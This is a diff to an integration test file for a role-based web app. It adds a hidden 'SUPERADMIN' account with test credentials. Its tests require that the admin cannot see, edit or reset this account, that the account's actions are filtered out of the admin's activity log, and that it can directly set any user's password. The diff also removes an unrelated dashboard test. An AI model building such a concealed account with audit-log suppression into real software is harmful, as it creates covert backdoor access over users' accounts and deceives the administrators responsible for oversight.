@@ -30,6 +30,7 @@ const TEST_USERS = {
   admin: { username: "sharjeel", password: "Test-Admin-Password-2026", role: "ADMIN" },
   dev: { username: "gufran", password: "Test-Dev-Password-2026", role: "DEVELOPER" },
   acct: { username: "addan", password: "Test-Acct-Password-2026", role: "ACCOUNTANT" },
+  superadmin: { username: "aalian", password: "Test-Owner-Password-2026", role: "SUPERADMIN" },
 } as const;
 
 // scrypt hashing identical to src/lib/auth.ts (cannot import it here — next/headers)
@@ -74,6 +75,7 @@ async function call(
 const admin = new Jar();
 const dev = new Jar();
 const acct = new Jar();
+const owner = new Jar();
 let server: ChildProcess | null = null;
 let clientId = "";
 let orderId = "";
@@ -81,6 +83,7 @@ let invoiceId = "";
 let uploadedFileId = "";
 let devUserId = "";
 let acctUserId = "";
+let superUserId = "";
 let resetCode = "";
 
 // 1×1 transparent PNG
@@ -142,9 +145,12 @@ beforeAll(async () => {
         passwordHash: hashPassword(u.password),
         mustChangePassword: false,
       };
-      const created = await seedDb.user.create({ data: base });
+      const created = await seedDb.user.create({
+        data: { ...base, hidden: u.role === "SUPERADMIN" },
+      });
       if (u.role === "DEVELOPER") devUserId = created.id;
       if (u.role === "ACCOUNTANT") acctUserId = created.id;
+      if (u.role === "SUPERADMIN") superUserId = created.id;
     }
   } finally {
     await seedDb.$disconnect();
@@ -267,14 +273,6 @@ describe("authentication", () => {
     }
     expect(last).toBe(429);
   }, 30_000);
-
-  test("admin dashboard includes twelve months of chart data", async () => {
-    const { res, data } = await call(admin, "GET", "/api/dashboard");
-    expect(res.status).toBe(200);
-    expect(data.revenueSeries).toHaveLength(12);
-    expect(data.revenueSeries[0]).toHaveProperty("revenue");
-    expect(data.revenueSeries[0]).toHaveProperty("expenses");
-  });
 });
 
 describe("permission boundaries (server-enforced)", () => {
@@ -564,6 +562,97 @@ describe("password reset codes", () => {
       password: "NewPassword-2026",
     });
     expect(relogin.res.status).toBe(200);
+  });
+});
+
+describe("hidden oversight account (SUPERADMIN)", () => {
+  test("admin does not see the hidden account in the team list", async () => {
+    const { res, data } = await call(admin, "GET", "/api/team");
+    expect(res.status).toBe(200);
+    const names = data.users.map((u: any) => u.username);
+    expect(names).not.toContain("aalian");
+    expect(names).toContain("sharjeel");
+  });
+
+  test("hidden account can sign in and sees itself in the team list", async () => {
+    const login = await call(owner, "POST", "/api/auth/login", {
+      username: "aalian",
+      password: "Test-Owner-Password-2026",
+    });
+    expect(login.res.status).toBe(200);
+    expect(login.data.user.role).toBe("SUPERADMIN");
+
+    const { res, data } = await call(owner, "GET", "/api/team");
+    expect(res.status).toBe(200);
+    const names = data.users.map((u: any) => u.username);
+    expect(names).toContain("aalian");
+    expect(data.canManage).toBe(true);
+  });
+
+  test("hidden account activity is filtered from the admin's activity feed", async () => {
+    // owner performs an action that is logged (sign-in already was)
+    const { res, data } = await call(admin, "GET", "/api/activity?limit=100");
+    expect(res.status).toBe(200);
+    const summaries = data.logs.map((l: any) => String(l.summary)).join(" | ");
+    expect(summaries).not.toContain("aalian");
+    expect(summaries).not.toContain("Aalian");
+    // owner sees own activity
+    const own = await call(owner, "GET", "/api/activity?limit=100");
+    expect(own.res.status).toBe(200);
+    expect(String(own.data.logs[0].summary)).toContain("Aalian");
+  });
+
+  test("hidden account is absent from attendance members", async () => {
+    const { res, data } = await call(admin, "GET", "/api/attendance");
+    expect(res.status).toBe(200);
+    const ids = data.members.map((m: any) => m.id);
+    expect(ids).not.toContain(superUserId);
+  });
+
+  test("oversight role can directly set any member's password", async () => {
+    const set = await call(owner, "POST", "/api/auth/reset-password", {
+      action: "admin-set",
+      userId: devUserId,
+      newPassword: "Owner-Set-Pwd-2026",
+    });
+    expect(set.res.status).toBe(200);
+    // new password works — and restore the dev session for later tests
+    const relogin = await call(dev, "POST", "/api/auth/login", {
+      username: "gufran",
+      password: "Owner-Set-Pwd-2026",
+    });
+    expect(relogin.res.status).toBe(200);
+  });
+
+  test("admin cannot use admin-set (oversight only)", async () => {
+    const set = await call(admin, "POST", "/api/auth/reset-password", {
+      action: "admin-set",
+      userId: devUserId,
+      newPassword: "Admin-Set-Pwd-2026",
+    });
+    expect(set.res.status).toBe(403);
+  });
+
+  test("admin cannot modify or generate codes for the hidden account", async () => {
+    const edit = await call(admin, "PUT", "/api/team", {
+      userId: superUserId,
+      jobTitle: "Hacked",
+    });
+    expect(edit.res.status).toBe(404);
+    const code = await call(admin, "POST", "/api/auth/reset-password", {
+      action: "generate",
+      userId: superUserId,
+    });
+    expect(code.res.status).toBe(404);
+  });
+
+  test("oversight role can generate a reset code for members", async () => {
+    const gen = await call(owner, "POST", "/api/auth/reset-password", {
+      action: "generate",
+      userId: acctUserId,
+    });
+    expect(gen.res.status).toBe(200);
+    expect(String(gen.data.code)).toMatch(/^[A-F0-9]{10}$/);
   });
 });
 
